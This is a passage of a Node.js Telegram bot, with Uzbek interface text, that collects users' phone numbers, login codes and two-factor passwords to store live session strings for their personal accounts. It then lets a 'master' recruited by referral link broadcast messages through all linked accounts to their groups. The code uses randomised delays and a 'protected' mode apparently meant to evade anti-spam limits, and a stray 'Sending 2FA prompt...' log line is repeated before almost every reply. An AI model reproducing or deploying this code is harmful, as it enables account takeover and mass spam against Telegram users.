  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (user?.isMaster) {
    const botInfo = await ctx.telegram.getMe();
    const refLink = `https://t.me/${botInfo.username}?start=ref_${user.refCode}`;
    console.log('Sending 2FA prompt...');
          await ctx.reply(
      `👑 Siz allaqachon master!\n\n📎 Referal: <code>${refLink}</code>`,
      { parse_mode: 'HTML' }
    );
    return;
  }

  if (user?.masterId) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('⚠️ Siz tobe sifatida ulangansiz. Master bo\'la olmaysiz.');
    return;
  }

  // Master qilish
  const refCode = generateRefCode();
  db.get('users').find({ id: userId.toString() }).assign({
    isMaster: true,
    refCode: refCode
  }).write();

  const botInfo = await ctx.telegram.getMe();
  const refLink = `https://t.me/${botInfo.username}?start=ref_${refCode}`;

  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `👑 <b>Siz master bo'ldingiz!</b>\n\n` +
    `📎 Referal havola:\n<code>${refLink}</code>\n\n` +
    `Bu havolani tobe'larga yuboring.\n` +
    `Ular session ulab, guruhlar tanlagandan keyin\n` +
    `siz xabar yozsangiz hammaga tarqaladi!`,
    {
      parse_mode: 'HTML',
      ...Markup.keyboard([
        ['📝 Xabar yozish'],
        ['🚀 Tarqatish', '🛡️ Xavfsiz tarqatish'],
        ['👥 Tobe\'lar', '📊 Hisobot'],
        ['🛑 Hammani to\'xtatish', 'ℹ️ Status']
      ]).resize()
    }
  );
});

// 📱 Session ulash (Master uchun)
bot.hears('📱 Session ulash', async (ctx) => {
  const userId = ctx.from.id;

  if (userClients.has(userId)) {
    console.log('Sending 2FA prompt...');
          await ctx.reply(
      '✅ Session allaqachon ulangan!\n\nQayta ulash:',
      Markup.inlineKeyboard([[Markup.button.callback('🔄 Qayta ulash', 'reconnect')]])
    );
    return;
  }

  userStates.set(userId, { step: 'waiting_phone' });
  console.log('Sending 2FA prompt...');
          await ctx.reply(
    '📱 <b>Telefon raqamingizni yuboring:</b>\n\n<i>Masalan: +998901234567</i>',
    { parse_mode: 'HTML' }
  );
});

// 📋 Guruhlarim (Master o'z guruhlarini tanlash)
bot.hears('📋 Guruhlarim', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.sessionString) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Avval session ulang! "📱 Session ulash" bosing');
    return;
  }

  console.log('Sending 2FA prompt...');
          await ctx.reply('⏳ Guruhlar yuklanmoqda...');

  const groups = await getGroups(userId);
  if (!groups.length) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Guruhlar topilmadi yoki session muddati tugagan.');
    return;
  }

  db.get('users').find({ id: userId.toString() }).assign({ availableGroups: groups }).write();

  const selectedIds = user.selectedGroups || [];
  const top40 = groups.slice(0, 40);

  const buttons = top40.map(g => {
    const icon = selectedIds.includes(g.id) ? '✅' : '⬜';
    const count = g.participantsCount > 0 ? `(${g.participantsCount})` : '';
    return [Markup.button.callback(`${icon} ${truncateName(g.title, 18)} ${count}`, `g_${g.id}`)];
  });

  buttons.push([
    Markup.button.callback('✅ Hammasi', 'sel_all'),
    Markup.button.callback('🔥 Top 40', 'sel_top40')
  ]);
  buttons.push([Markup.button.callback('❌ Tozalash', 'desel_all')]);
  buttons.push([Markup.button.callback('💾 Saqlash', 'save_grps')]);

  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `📋 <b>Sizning guruhlaringiz</b> (${groups.length})\nTanlangan: ${selectedIds.length}`,
    { parse_mode: 'HTML', ...Markup.inlineKeyboard(buttons) }
  );
});

// 📤 O'zimdan (Master o'z akkauntidan yuborish)
bot.hears('📤 O\'zimdan', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.broadcastMessage) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Avval xabar yozing! "📝 Xabar yozish" bosing');
    return;
  }

  if (!user?.sessionString) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Session ulanmagan! "📱 Session ulash" bosing');
    return;
  }

  if (!user?.selectedGroups?.length) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Guruhlar tanlanmagan! "📋 Guruhlarim" bosing');
    return;
  }

  // Master o'zidan yuborish
  startBroadcast(userId, ctx, false);
});

// 🛡️ O'zimdan (xavfsiz)
bot.hears('🛡️ O\'zimdan (xavfsiz)', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.broadcastMessage) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Avval xabar yozing! "📝 Xabar yozish" bosing');
    return;
  }

  if (!user?.sessionString) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Session ulanmagan! "📱 Session ulash" bosing');
    return;
  }

  if (!user?.selectedGroups?.length) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Guruhlar tanlanmagan! "📋 Guruhlarim" bosing');
    return;
  }

  startBroadcast(userId, ctx, true);
});

// 👥 Tobe'lardan (faqat tobe'lar orqali)
bot.hears('👥 Tobe\'lardan', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.isMaster) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Siz master emassiz!');
    return;
  }

  if (!user?.broadcastMessage) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Avval xabar yozing! "📝 Xabar yozish" bosing');
    return;
  }

  await masterBroadcast(userId, user.broadcastMessage, ctx, false);
});

// 🛡️ Tobe'lar (xavfsiz)
bot.hears('🛡️ Tobe\'lar (xavfsiz)', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.isMaster) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Siz master emassiz!');
    return;
  }

  if (!user?.broadcastMessage) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Avval xabar yozing! "📝 Xabar yozish" bosing');
    return;
  }

  await masterBroadcast(userId, user.broadcastMessage, ctx, true);
});

// 👥 Tobe'lar ro'yxati
bot.hears('👥 Tobe\'lar ro\'yxati', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.isMaster) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Siz master emassiz!');
    return;
  }

  const slaves = getSlaves(userId);

  if (slaves.length === 0) {
    const botInfo = await ctx.telegram.getMe();
    const refLink = `https://t.me/${botInfo.username}?start=ref_${user.refCode}`;
    console.log('Sending 2FA prompt...');
          await ctx.reply(
      `👥 <b>Tobe'lar yo'q</b>\n\n` +
      `📎 Referal havolani ulashing:\n<code>${refLink}</code>`,
      { parse_mode: 'HTML' }
    );
    return;
  }

  let msg = `👥 <b>Tobe'lar: ${slaves.length} ta</b>\n\n`;

  slaves.forEach((s, i) => {
    const hasSession = s.sessionString ? '✅' : '❌';
    const groupCount = s.selectedGroups?.length || 0;
    const name = s.telegramName || s.name || s.phone || `#${s.id.substring(0, 6)}`;
    const isActive = activeBroadcasts.has(parseInt(s.id)) ? '🟢' : '⚪';

    msg += `${i + 1}. ${isActive} ${name}\n`;
    msg += `   Session: ${hasSession} | Guruhlar: ${groupCount}\n`;
  });

  const readyCount = slaves.filter(s => s.sessionString && s.selectedGroups?.length > 0).length;
  const totalGroups = slaves.reduce((sum, s) => sum + (s.selectedGroups?.length || 0), 0);

  msg += `\n📊 <b>Tayyor:</b> ${readyCount}/${slaves.length}`;
  msg += `\n📋 <b>Jami guruhlar:</b> ${totalGroups}`;

  console.log('Sending 2FA prompt...');
          await ctx.reply(msg, { parse_mode: 'HTML' });
});

// 📊 Hisobot
bot.hears('📊 Hisobot', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.isMaster) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Siz master emassiz!');
    return;
  }

  const slaves = getSlaves(userId);
  const readySlaves = slaves.filter(s => s.sessionString && s.selectedGroups?.length > 0);
  const activeSlaves = slaves.filter(s => activeBroadcasts.has(parseInt(s.id)));
  const totalGroups = readySlaves.reduce((sum, s) => sum + (s.selectedGroups?.length || 0), 0);

  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `📊 <b>MASTER HISOBOT</b>\n\n` +
    `👥 Jami tobe'lar: ${slaves.length}\n` +
    `✅ Tayyor (session+guruh): ${readySlaves.length}\n` +
    `🟢 Hozir faol: ${activeSlaves.length}\n` +
    `📋 Jami guruhlar: ${totalGroups}\n\n` +
    `📎 Referal: ref_${user.refCode}`,
    { parse_mode: 'HTML' }
  );
});

// 🛑 Hammani to'xtatish
bot.hears('🛑 Hammani to\'xtatish', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  if (!user?.isMaster) {
    // Oddiy user - faqat o'zini to'xtatish
    activeBroadcasts.delete(userId);
    console.log('Sending 2FA prompt...');
          await ctx.reply('🛑 To\'xtatildi');
    return;
  }

  // Master - barcha tobe'larni to'xtatish
  const slaves = getSlaves(userId);
  let stoppedCount = 0;

  for (const slave of slaves) {
    const slaveId = parseInt(slave.id);
    if (activeBroadcasts.has(slaveId)) {
      activeBroadcasts.delete(slaveId);
      stoppedCount++;

      try {
        await ctx.telegram.sendMessage(slaveId, '🛑 Master tarqatishni to\'xtatdi');
      } catch (e) {}
    }
  }

  console.log('Sending 2FA prompt...');
          await ctx.reply(`🛑 <b>Barcha tarqatishlar to'xtatildi</b>\n\nTo'xtatilgan: ${stoppedCount} ta tobe`, { parse_mode: 'HTML' });
});

// ============== REGULAR USER HANDLERS ==============

bot.hears('📱 Ro\'yxatdan o\'tish', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();

  // Master bo'lsa session kerak emas
  if (user?.isMaster) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('👑 Siz master! Session ulash shart emas.');
    return;
  }

  if (userClients.has(userId)) {
    console.log('Sending 2FA prompt...');
          await ctx.reply(
      '✅ Allaqachon ulangansiz!\n\nQayta ulash:',
      Markup.inlineKeyboard([[Markup.button.callback('🔄 Qayta ulash', 'reconnect')]])
    );
    return;
  }

  userStates.set(userId, { step: 'waiting_phone' });
  console.log('Sending 2FA prompt...');
          await ctx.reply(
    '📱 <b>Telefon raqamingizni yuboring:</b>\n\n<i>Masalan: +998901234567</i>',
    { parse_mode: 'HTML' }
  );
});

bot.action('reconnect', async (ctx) => {
  const userId = ctx.from.id;
  const oldClient = userClients.get(userId);
  if (oldClient) {
    try { await oldClient.disconnect(); } catch (e) {}
    userClients.delete(userId);
  }

  userStates.set(userId, { step: 'waiting_phone' });
  await ctx.answerCbQuery();
  console.log('Sending 2FA prompt...');
          await ctx.reply('📱 Telefon raqamingizni yuboring:', { parse_mode: 'HTML' });
});

bot.hears('ℹ️ Status', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();
  const isConnected = userClients.has(userId) || user?.sessionString;
  const isBroadcasting = activeBroadcasts.has(userId);
  const userBlocked = blockedGroups.get(userId) || new Set();

  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `📊 <b>STATUS</b>\n\n` +
    `🔗 Session: ${isConnected ? '✅' : '❌'}\n` +
    `📱 Tel: ${user?.phone || '-'}\n` +
    `📋 Guruhlar: ${user?.selectedGroups?.length || 0}\n` +
    `🚫 Bloklangan: ${userBlocked.size}\n` +
    `📝 Xabar: ${user?.broadcastMessage ? '✅' : '❌'}\n` +
    `🚀 Tarqatish: ${isBroadcasting ? '🟢 Ishlayapti' : '⚪ To\'xtagan'}\n\n` +
    `⚙️ Delay: 0.3-6 sek | Pauza: 5 daq`,
    {
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Blokni tozalash', 'clear_blocked')]
      ])
    }
  );
});

bot.action('clear_blocked', async (ctx) => {
  const userId = ctx.from.id;
  blockedGroups.delete(userId);
  await ctx.answerCbQuery('✅ Bloklangan guruhlar tozalandi!');
  await ctx.editMessageText(
    '✅ Bloklangan guruhlar tozalandi!\n\nEndi barcha guruhlar qayta ishlatiladi.',
    { parse_mode: 'HTML' }
  );
});

bot.hears('📋 Guruhlar', async (ctx) => {
  const userId = ctx.from.id;

  const user = db.get('users').find({ id: userId.toString() }).value();
  if (!user?.sessionString) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Avval ro\'yxatdan o\'ting!');
    return;
  }

  console.log('Sending 2FA prompt...');
          await ctx.reply('⏳ Yuklanmoqda... (guruhlar faollik bo\'yicha tartiblanadi)');

  const groups = await getGroups(userId);
  if (!groups.length) {
    console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Guruhlar topilmadi yoki session muddati tugagan. Qayta ulaning.');
    return;
  }

  db.get('users').find({ id: userId.toString() }).assign({ availableGroups: groups }).write();

  const userData = db.get('users').find({ id: userId.toString() }).value();
  const selectedIds = userData.selectedGroups || [];

  const top40 = groups.slice(0, 40);

  const buttons = top40.map(g => {
    const icon = selectedIds.includes(g.id) ? '✅' : '⬜';
    const count = g.participantsCount > 0 ? `(${g.participantsCount})` : '';
    return [Markup.button.callback(`${icon} ${truncateName(g.title, 18)} ${count}`, `g_${g.id}`)];
  });

  buttons.push([
    Markup.button.callback('✅ Hammasi', 'sel_all'),
    Markup.button.callback('🔥 Top 40', 'sel_top40')
  ]);
  buttons.push([
    Markup.button.callback('❌ Tozalash', 'desel_all')
  ]);
  buttons.push([Markup.button.callback('💾 Saqlash', 'save_grps')]);

  console.log('Sending 2FA prompt...');
          await ctx.reply(
    `📋 <b>Guruhlar</b> (${groups.length})\nTanlangan: ${selectedIds.length}`,
    { parse_mode: 'HTML', ...Markup.inlineKeyboard(buttons) }
  );
});

bot.action(/^g_(.+)$/, async (ctx) => {
  const groupId = ctx.match[1];
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();
  let selected = user.selectedGroups || [];

  if (selected.includes(groupId)) {
    selected = selected.filter(id => id !== groupId);
  } else {
    selected.push(groupId);
  }

  db.get('users').find({ id: userId.toString() }).assign({ selectedGroups: selected }).write();
  await ctx.answerCbQuery(selected.includes(groupId) ? '✅' : '❌');
});

bot.action('sel_all', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();
  const allIds = (user.availableGroups || []).map(g => g.id);
  db.get('users').find({ id: userId.toString() }).assign({ selectedGroups: allIds }).write();
  await ctx.answerCbQuery(`✅ ${allIds.length} ta`);
});

bot.action('sel_top40', async (ctx) => {
  const userId = ctx.from.id;
  const user = db.get('users').find({ id: userId.toString() }).value();
  const top40Ids = (user.availableGroups || []).slice(0, 40).map(g => g.id);
  db.get('users').find({ id: userId.toString() }).assign({ selectedGroups: top40Ids }).write();
  await ctx.answerCbQuery(`🔥 Eng faol ${top40Ids.length} ta tanlandi!`);
});

bot.action('desel_all', async (ctx) => {
  db.get('users').find({ id: ctx.from.id.toString() }).assign({ selectedGroups: [] }).write();
  await ctx.answerCbQuery('❌');
});

bot.action('save_grps', async (ctx) => {
  const user = db.get('users').find({ id: ctx.from.id.toString() }).value();
  await ctx.answerCbQuery('💾');
  await ctx.editMessageText(`✅ ${(user.selectedGroups || []).length} ta guruh saqlandi!`);
});

bot.hears('📝 Xabar yozish', async (ctx) => {
  userStates.set(ctx.from.id, { step: 'waiting_message' });
  console.log('Sending 2FA prompt...');
          await ctx.reply('📝 Xabarni yozing:');
});

bot.hears('🚀 Boshlash', (ctx) => startBroadcast(ctx.from.id, ctx, false));

bot.hears('🛡️ 100% Himoyalangan', (ctx) => startBroadcast(ctx.from.id, ctx, true));

bot.hears('🛑 To\'xtatish', async (ctx) => {
  activeBroadcasts.set(ctx.from.id, false);
  console.log('Sending 2FA prompt...');
          await ctx.reply('🛑 To\'xtatildi');
});

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const state = userStates.get(userId);
  const text = ctx.message.text;

  if (!state) return;

  if (state.step === 'waiting_phone') {
    const phone = text.replace(/[\s\-\(\)]/g, '');

    if (!phone.match(/^\+?\d{10,15}$/)) {
      console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Noto\'g\'ri! Masalan: +998901234567');
      return;
    }

    console.log('Sending 2FA prompt...');
          await ctx.reply('⏳ Ulanmoqda...');

    startAuth(userId, phone, ctx).then(async (result) => {
      if (result.success) {
        console.log('Sending 2FA prompt...');
          await ctx.reply(
          `✅ <b>Muvaffaqiyatli!</b>\n\n👤 ${result.name}\n📱 ${result.phone}\n\nEndi "📋 Guruhlar" bosing`,
          { parse_mode: 'HTML' }
        );
      } else if (!result.silent && result.error !== 'cancelled') {
        let errorMsg = result.error;
        if (errorMsg.includes('PHONE_CODE_EXPIRED')) {
          errorMsg = 'Kod eskirgan. Qayta urinib ko\'ring.';
        } else if (errorMsg.includes('PHONE_CODE_INVALID')) {
          errorMsg = 'Kod noto\'g\'ri. Qayta urinib ko\'ring.';
        } else if (errorMsg.includes('PHONE_NUMBER_INVALID')) {
          errorMsg = 'Telefon raqam noto\'g\'ri.';
        } else if (errorMsg.includes('FLOOD_WAIT')) {
          errorMsg = 'Ko\'p urinish. Biroz kuting.';
        }
        console.log('Sending 2FA prompt...');
          await ctx.reply(`❌ Xato: ${errorMsg}`);
      }
    });

    return;
  }

  if (state.step === 'waiting_code') {
    const resolver = authResolvers.get(userId);
    if (resolver) {
      const cleanCode = text.replace(/\D/g, '');
      console.log(`User sent: "${text}" -> cleaned: "${cleanCode}"`);

      if (cleanCode.length < 5) {
        console.log('Sending 2FA prompt...');
          await ctx.reply('❌ Kod kamida 5 ta raqamdan iborat bo\'lishi kerak!');
        return;
      }

      resolver.resolveCode(cleanCode);
      console.log('Sending 2FA prompt...');
          await ctx.reply('⏳ Tekshirilmoqda...');
    }
    return;
  }

  if (state.step === 'waiting_2fa') {
    const resolver = authResolvers.get(userId);
    if (resolver) {
      resolver.resolvePassword(text);
      console.log('Sending 2FA prompt...');
          await ctx.reply('⏳ Tekshirilmoqda...');
    }
    return;
  }

  if (state.step === 'waiting_message') {
    userStates.delete(userId);
    db.get('users').find({ id: userId.toString() }).assign({ broadcastMessage: text }).write();
    console.log('Sending 2FA prompt...');
          await ctx.reply(`✅ Xabar saqlandi!\n\nEndi "🚀 Boshlash" bosing`);
    return;
  }
});

bot.catch((err) => console.error('Bot error:', err));

bot.launch().then(() => {
  console.log('✅ Broadcast Bot v3.0 ishga tushdi!');
  console.log('   🆕 Master/Tobe tizimi');
  console.log('   Rejimlar:');
  console.log('   🚀 Oddiy:       0.3-6 sek delay, 5 daq pauza');
  console.log('   🛡️ Himoyalangan: 1-15 sek delay, 10 daq pauza');
  console.log('   👑 Master - session ulamaydi, tobe\'larga buyruq beradi');
}).catch(console.error);

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
